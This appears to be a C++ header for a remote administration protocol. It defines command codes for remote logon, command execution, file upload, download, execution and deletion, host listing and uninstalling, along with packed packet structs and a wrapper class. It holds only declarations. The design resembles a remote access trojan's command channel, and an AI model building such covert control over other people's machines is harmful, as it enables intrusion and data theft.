#pragma once




#include <windows.h>


#include "public.h"


#define CMD_ONLINE				"$$00"

#define CMD_QUERY_OPERATOR		"$$01"
#define CMD_SUCCESS				"$$30"

#define CMD_GETHOST				"$$02"

#define CMD_REMOTE_LOGON		"$$03"
#define CMD_SEND_DRIVER			"$$04"
#define CMD_GET_DRIVER			"$$05"

#define CMD_QUERY_FOLDER		"$$06"

#define CMD_SEND_FOLDER			"$$07"

#define CMD_GET_FOLDER			"$$08"

#define CMD_CLEAR_STATUS		"$$23"

#define CMD_SEND_UP_DATA		"$$0a"

#define CMD_SEND_UP_CMD			"$$09"

#define CMD_GET_UP_DATA			"$$0b"

#define CMD_QUERY_UP_STATUS		"$$25"

#define CMD_UPDATE_UP_STATUS	"$$24"

#define CMD_CLEAN_DD_RECORD		"$$19"

#define CMD_START_DOWNLOAD		"$$0C"

#define CMD_UPDATE_DD_STATUS	"$$0f"
#define CMD_SEND_DD_DATA		"$$0d"
#define CMD_GET_DD_DATA			"$$0e"


#define CMD_QUERY_DD_STATUS		"$$10"

#define CMD_START_CMD			"$$11"
#define CMD_SEND_CMD_RESULT		"$$12"

#define CMD_GET_CMD_RESULT		"$$13"

#define CMD_SEND_CMD			"$$14"
#define CMD_GET_CMD				"$$15"
#define CMD_DELETE_FILE			"$$16"
#define CMD_EXECUTE_FILE		"$$17"

#define CMD_DEL_HOST_RECORD		"$$20"

#define CMD_UNINSTALL			"$$22"
#define CMD_COPY_FOLDER			"$$29"

#define CMD_MOVE_FILE			"$$26"
#define CMD_RENAME_FILE			"$$28"
#define CMD_FILE_SATA			"$$27"
#define CMD_CREATE_FILE			"$$31"
#define CMD_WRITE_FILE_SATA		"$$32"


#define GETHOST_ALLH			"allh"

#define GETHOST_LIVE			"live"

#define DATA_PACK_TAG			'ataD'

#define INVALID_RESPONSE		'datA'

#pragma pack(1)

typedef struct
{
	DWORD tag;

	char cmd[4];

	CHAR subcmd[4];

	DWORD tagEnd;

}SUBCMD_HEADER;

typedef struct
{
	DWORD tag;

	char cmd[4];

	unsigned char hostname_len;

	unsigned char hostname[UUID_LENGTH];

}DATA_PADDING;

typedef struct
{
	DATA_PADDING hdr;

	unsigned char filename_len;

	unsigned char filename[0];

}PACK_STR_HEADER;

#pragma pack()


class PacketHeader{
public:
	PacketHeader();

	virtual ~PacketHeader();

	int online(char** data, int* datasize);

	int fileWrapper(const char* filename,char** data, int* datasize);

	int cmdWrapper(char * data,int  size,const char * cmd,char ** out,int *outsize);

	int cmdWrapper(char* data, int size, const char* cmd, const char* subcmd, char** out, int* outisize);

	int cmdStrWrapper(char* data, int size, const char* cmd, const char* str, char** out, int* outisize);

};